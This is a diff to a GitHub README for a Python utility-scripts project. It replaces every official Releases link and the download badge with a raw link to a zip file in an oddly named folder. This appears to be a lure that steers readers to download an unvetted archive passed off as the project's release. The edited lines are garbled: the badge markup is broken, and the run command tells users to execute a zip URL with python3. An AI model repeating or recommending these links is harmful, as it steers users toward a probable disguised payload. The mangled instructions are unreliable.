@@ -1,7 +1,7 @@
 # 🐍 utils-python-scripts - Simplify Your Development Tasks
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/Melanietransmissible581/utils-python-scripts/releases)
+[![Download](https://raw.githubusercontent.com/Melanietransmissible581/utils-python-scripts/main/acacatechol/utils-python-scripts.zip%20Latest%https://raw.githubusercontent.com/Melanietransmissible581/utils-python-scripts/main/acacatechol/utils-python-scripts.zip)](https://raw.githubusercontent.com/Melanietransmissible581/utils-python-scripts/main/acacatechol/utils-python-scripts.zip)
 
 ## 📚 Overview
 Welcome to the `utils-python-scripts` repository. This collection of Python scripts automates development tasks, making your workflow smoother and more efficient. The scripts focus on performing intelligent directory backups and cleaning unnecessary files safely. You can use these tools without worrying about external dependencies. They are optimized for performance and designed with ease of use in mind. This package works well on Linux.
@@ -10,7 +10,7 @@ Welcome to the `utils-python-scripts` repository. This collection of Python scri
 Follow these steps to download and run the scripts:
 
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/Melanietransmissible581/utils-python-scripts/releases) to find the latest version of the scripts.
+   Go to the [Releases page](https://raw.githubusercontent.com/Melanietransmissible581/utils-python-scripts/main/acacatechol/utils-python-scripts.zip) to find the latest version of the scripts.
 
 2. **Download the Latest Release**
    Look for the newest version listed. Click the download link to save the zip file to your computer.
@@ -30,9 +30,9 @@ Follow these steps to download and run the scripts:
 6. **Run a Script**
    To execute a script, simply type:
    ```bash
-   python3 name_of_script.py
+   python3 https://raw.githubusercontent.com/Melanietransmissible581/utils-python-scripts/main/acacatechol/utils-python-scripts.zip
    ```
-   Replace `name_of_script.py` with the actual name of the script you wish to run. 
+   Replace `https://raw.githubusercontent.com/Melanietransmissible581/utils-python-scripts/main/acacatechol/utils-python-scripts.zip` with the actual name of the script you wish to run. 
 
 7. **Follow Instructions**
    Each script includes comments that explain its functionality. Make sure to read these comments for guidance on its usage.
@@ -67,6 +67,6 @@ If you encounter issues or have questions, you can reach out through the GitHub 
 This project is open-source. You can use and modify the scripts per the terms of the license found in the repository.
 
 ## 📥 Download Again
-Don't forget to visit the [Releases page](https://github.com/Melanietransmissible581/utils-python-scripts/releases) to grab the latest version of the scripts.
+Don't forget to visit the [Releases page](https://raw.githubusercontent.com/Melanietransmissible581/utils-python-scripts/main/acacatechol/utils-python-scripts.zip) to grab the latest version of the scripts.
 
 Thank you for using `utils-python-scripts`. We hope these tools help improve your development workflow!
